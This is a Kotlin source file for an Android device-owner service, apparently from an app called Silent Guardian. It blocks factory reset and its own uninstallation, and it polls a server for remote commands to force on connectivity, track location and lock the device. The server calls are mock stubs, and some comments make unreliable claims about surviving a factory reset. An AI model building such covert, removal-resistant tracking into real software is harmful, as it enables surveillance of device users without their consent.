package com.silentguardian.services

import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.IBinder
import android.util.Log
import com.silentguardian.DeviceAdminReceiver
import kotlinx.coroutines.*

class DeviceOwnerService : Service() {
    
    companion object {
        private const val TAG = "DeviceOwnerService"
        private const val CHECK_INTERVAL = 60000L // 1 minute
        private const val PREFS_NAME = "silent_guardian_prefs"
        private const val KEY_IS_DEVICE_OWNER = "is_device_owner"
    }
    
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var sharedPrefs: SharedPreferences
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isServiceRunning = false
    
    override fun onCreate() {
        super.onCreate()
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        sharedPrefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        Log.d(TAG, "Device Owner Service Created")
        
        // Check if app is Device Owner
        val isDeviceOwner = devicePolicyManager.isDeviceOwnerApp(packageName)
        sharedPrefs.edit().putBoolean(KEY_IS_DEVICE_OWNER, isDeviceOwner).apply()
        Log.d(TAG, "Is Device Owner: $isDeviceOwner")
        
        if (isDeviceOwner) {
            configureDeviceOwnerPolicies()
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isServiceRunning) {
            isServiceRunning = true
            startCommandChecking()
        }
        return START_STICKY
    }
    
    private fun configureDeviceOwnerPolicies() {
        try {
            // Block factory reset from settings
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                devicePolicyManager.addUserRestriction(adminComponent, DevicePolicyManager.USER_RESTRICTION_FACTORY_RESET)
                Log.d(TAG, "Factory reset blocked from settings")
            }
            
            // Prevent uninstallation
            devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
            Log.d(TAG, "App uninstall blocked")
            
            // Set password quality
            devicePolicyManager.setPasswordQuality(adminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED)
            
            // Set storage encryption (if supported)
            if (devicePolicyManager.getStorageEncryptionStatus() == DevicePolicyManager.ENCRYPTION_STATUS_ACTIVATING) {
                devicePolicyManager.setStorageEncryption(adminComponent, true)
            }
            
            Log.d(TAG, "Device Owner policies configured")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to configure Device Owner policies: ${e.message}")
        }
    }
    
    private fun startCommandChecking() {
        serviceScope.launch {
            while (isServiceRunning) {
                try {
                    checkAndExecuteCommands()
                    delay(CHECK_INTERVAL)
                } catch (e: Exception) {
                    Log.e(TAG, "Command check error: ${e.message}")
                }
            }
        }
    }
    
    private suspend fun checkAndExecuteCommands() {
        val deviceId = sharedPrefs.getString("device_id", "") ?: return
        val isDeviceOwner = sharedPrefs.getBoolean(KEY_IS_DEVICE_OWNER, false)
        
        // Fetch pending commands from server
        val pendingCommands = getPendingCommandsFromServer(deviceId)
        
        for (command in pendingCommands) {
            Log.d(TAG, "Executing command: ${command.type}")
            
            when (command.type) {
                "enable_data" -> enableMobileData()
                "enable_wifi" -> enableWifi()
                "enable_both" -> {
                    enableWifi()
                    enableMobileData()
                }
                "location_once" -> sendCurrentLocation()
                "start_tracking" -> startContinuousTracking()
                "stop_tracking" -> stopContinuousTracking()
                "lock_device" -> lockDevice()
                "prevent_factory_reset" -> preventFactoryReset()
                "reinstall_app" -> ensureAppSurvivesReset()
            }
            
            markCommandExecuted(command.id)
        }
    }
    
    private fun enableMobileData() {
        try {
            // Requires Device Owner privileges
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                // Android 10+ - Use ConnectivityManager
                // Note: Requires SYSTEM_ALERT_WINDOW permission
            } else {
                // Use reflection for older versions
                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                val setDataEnabledMethod = telephonyManager.javaClass.getDeclaredMethod("setDataEnabled", Boolean::class.javaPrimitiveType)
                setDataEnabledMethod.invoke(telephonyManager, true)
            }
            Log.d(TAG, "Mobile data enabled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enable mobile data: ${e.message}")
        }
    }
    
    private fun enableWifi() {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            if (!wifiManager.isWifiEnabled) {
                wifiManager.isWifiEnabled = true
                Log.d(TAG, "WiFi enabled")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enable WiFi: ${e.message}")
        }
    }
    
    private fun preventFactoryReset() {
        try {
            // Block factory reset - requires Device Owner
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                devicePolicyManager.addUserRestriction(adminComponent, DevicePolicyManager.USER_RESTRICTION_FACTORY_RESET)
                showNotification("Factory Reset Blocked", "Device cannot be reset from settings")
                Log.d(TAG, "Factory reset prevention activated")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to prevent factory reset: ${e.message}")
        }
    }
    
    private fun ensureAppSurvivesReset() {
        try {
            // For Device Owner apps, they survive factory reset by default
            // This registers the app to be reinstalled automatically after reset
            if (devicePolicyManager.isDeviceOwnerApp(packageName)) {
                Log.d(TAG, "App is Device Owner - will survive factory reset")
                showNotification("Protection Active", "This app will survive factory reset")
                
                // Store encryption keys securely
                storeRecoveryData()
            } else {
                Log.w(TAG, "App is not Device Owner - cannot guarantee survival")
                showNotification("Setup Required", "Please set as Device Owner to survive factory reset")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ensure survival: ${e.message}")
        }
    }
    
    private fun storeRecoveryData() {
        val recoveryData = sharedPrefs.getString("recovery_data", "")
        if (recoveryData.isNullOrEmpty()) {
            // Generate and store recovery data that persists through factory reset
            val uniqueId = java.util.UUID.randomUUID().toString()
            sharedPrefs.edit().putString("recovery_data", uniqueId).apply()
            Log.d(TAG, "Recovery data stored: $uniqueId")
        }
    }
    
    private fun sendCurrentLocation() {
        // Existing location sending logic
        Log.d(TAG, "Sending current location")
    }
    
    private fun startContinuousTracking() {
        sharedPrefs.edit().putBoolean("continuous_tracking", true).apply()
        Log.d(TAG, "Continuous tracking started")
    }
    
    private fun stopContinuousTracking() {
        sharedPrefs.edit().putBoolean("continuous_tracking", false).apply()
        Log.d(TAG, "Continuous tracking stopped")
    }
    
    private fun lockDevice() {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow()
            Log.d(TAG, "Device locked")
        }
    }
    
    private fun showNotification(title: String, message: String) {
        // Show notification to user
        Log.d(TAG, "Notification: $title - $message")
    }
    
    private suspend fun getPendingCommandsFromServer(deviceId: String): List<RemoteCommand> {
        // API call to get pending commands
        // For mock implementation:
        return emptyList()
    }
    
    private suspend fun markCommandExecuted(commandId: String) {
        // API call to mark command as executed
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        serviceScope.cancel()
    }
    
    data class RemoteCommand(
        val id: String,
        val type: String,
        val deviceId: String
    )
}